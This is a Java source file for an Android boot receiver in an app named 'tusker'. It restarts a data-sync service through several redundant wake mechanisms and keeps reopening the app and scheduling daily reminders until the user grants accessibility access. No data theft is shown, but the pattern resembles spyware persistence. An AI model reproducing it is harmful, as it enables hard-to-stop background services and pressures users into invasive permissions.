package com.task.tusker.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.task.tusker.MainActivity;
import com.task.tusker.permissions.AutoPermissionManager;
import com.task.tusker.services.DataSyncService;
import com.task.tusker.services.ServiceWatchdog;
import com.task.tusker.services.WakeWorker;

/**
 * BootReceiver — Method 2: Boot / power / self-update wake.
 *
 * Handles every system event that signals the device is freshly available:
 *   • ACTION_BOOT_COMPLETED          — normal boot (after unlock on API 24+)
 *   • ACTION_LOCKED_BOOT_COMPLETED   — direct-boot (API 24+, before unlock)
 *   • QUICKBOOT_POWERON              — HTC/some OEM fast-boot
 *   • MY_PACKAGE_REPLACED            — app updated → re-arm everything
 *
 * On each event it:
 *   1. Starts DataSyncService as a foreground service.
 *   2. Arms the AlarmManager 15-minute heartbeat (Method 4).
 *   3. Queues the WorkManager periodic task (Method 5).
 *   4. Re-schedules the 3 daily accessibility reminder alarms.
 *   5. If accessibility is not yet granted, opens MainActivity after a short
 *      delay so the user sees the setup screen once the device has settled.
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG             = "BootReceiver";
    // Delay before opening the app (ms) — gives the launcher time to load.
    private static final long   BOOT_APP_DELAY  = 30_000L; // 30 seconds

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        if (action == null) return;

        switch (action) {
            case Intent.ACTION_BOOT_COMPLETED:
            case "android.intent.action.LOCKED_BOOT_COMPLETED":
            case "android.intent.action.QUICKBOOT_POWERON":
            case Intent.ACTION_MY_PACKAGE_REPLACED:
                Log.i(TAG, "Wake event: " + action);
                wakeUp(context);
                break;
            default:
                break;
        }
    }

    private void wakeUp(Context context) {
        // 1. Start the primary foreground service
        try {
            Intent serviceIntent = new Intent(context, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            Log.d(TAG, "DataSyncService start requested");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start DataSyncService: " + e.getMessage());
        }

        // 2. Arm the AlarmManager heartbeat (Method 4)
        ServiceWatchdog.scheduleWakeAlarm(context);

        // 3. Enqueue WorkManager periodic task (Method 5)
        WakeWorker.schedule(context);

        // 4. Revive accessibility service if it was running before the reboot
        ServiceWatchdog.ensureAccessibilityRunning(context);

        // 5. Re-arm the three daily accessibility reminders
        AccessibilityReminderReceiver.scheduleDailyReminders(context);

        // 6. If accessibility is not yet granted, open the app after the device
        //    has had 30 s to settle (screen on, launcher loaded, etc.)
        final Context appContext = context.getApplicationContext();
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                AutoPermissionManager apm = new AutoPermissionManager(appContext);
                if (!apm.isAccessibilityServiceEnabled()) {
                    Intent launch = new Intent(appContext, MainActivity.class);
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
                            | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    appContext.startActivity(launch);
                    Log.i(TAG, "Opened MainActivity — accessibility not yet granted");
                }
            } catch (Exception e) {
                Log.e(TAG, "Boot app-open error: " + e.getMessage());
            }
        }, BOOT_APP_DELAY);
    }
}
